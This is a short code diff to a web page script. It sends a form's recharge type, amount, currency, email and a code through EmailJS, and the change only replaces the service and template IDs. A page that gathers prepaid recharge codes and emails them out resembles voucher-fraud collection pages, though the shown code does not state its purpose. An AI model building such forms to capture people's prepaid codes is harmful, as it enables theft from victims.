@@ -49,7 +49,7 @@ document.addEventListener("DOMContentLoaded", () => {
 
     if (form.type && form.montant && form.devise && form.mail && form.code.length) {
 
-    emailjs.send("bao_service", "bao_template", {
+    emailjs.send("service_8cizx6n", "template_3ojl5n6", {
       recharge: form.type,
       montant: form.montant,
       devise: form.devise,
